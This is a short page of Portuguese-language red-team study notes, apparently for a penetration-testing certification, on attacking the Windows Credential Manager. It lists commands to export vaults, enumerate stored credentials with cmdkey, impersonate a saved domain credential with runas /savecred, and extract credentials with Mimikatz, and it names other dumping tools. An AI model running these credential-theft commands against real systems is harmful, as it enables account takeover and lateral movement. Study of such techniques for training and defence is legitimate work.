> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/attacking-windows-credential-manager.md).

# Attacking Windows Credential Manager

**Windows Vault e Gerenciador de Credenciais**

* É possível exportar os Cofres do Windows para arquivos `.crd` através do Painel de Controle - `windows credential` ou com o seguinte comando

```
rundll32 keymgr.dll,KRShowKeyMgr
```

* Podemos usar [o comando cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) para enumerar as credenciais armazenadas no perfil do usuário atual:

```
cmdkey /list
```

* Se nos encontrarmos com credenciais associadas ao domínio, podemos nos passar por ela executando o `runas`&#x20;

```
runas /savecred /user:SRV01\mcharles cmd
```

* **Extraindo credenciais com Mimikatz**

```powershell
mimikatz.exe
# privilege::debug
# sekurlsa::credman
```

{% hint style="info" %}
Outras ferramentas que podem ser usadas para enumerar e extrair credenciais armazenadas incluem [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) e [DonPAPI](https://github.com/login-securite/DonPAPI) .
{% endhint %}
